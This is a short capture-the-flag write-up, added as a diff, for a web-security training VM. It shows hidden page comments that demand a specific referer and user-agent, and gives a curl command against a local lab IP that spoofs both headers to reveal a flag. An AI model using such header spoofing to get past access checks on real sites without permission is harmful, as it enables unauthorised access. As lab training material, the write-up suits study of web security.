@@ -1,0 +1,19 @@
+in /index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
+in the copyright link
+
+in the comments we can see
+You must cumming from : "https://www.nsa.gov/" to go to the next step
+
+and :
+Let's use this browser : "ft_bornToSec". It will help you a lot.
+
+we can make a request with referer="https://www.nsa.gov/"
+and user-agent=ft_bornToSec
+curl -X GET \
+		 'http://192.168.56.101/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' \
+		 -H 'cache-control: no-cache' \
+		 -H 'postman-token: cbd20591-f157-a68c-cdea-b72a48443371' \
+		 -H 'referer: https://www.nsa.gov/' \
+		 -H 'user-agent: ft_bornToSec' | grep flag
+
+and get the flag
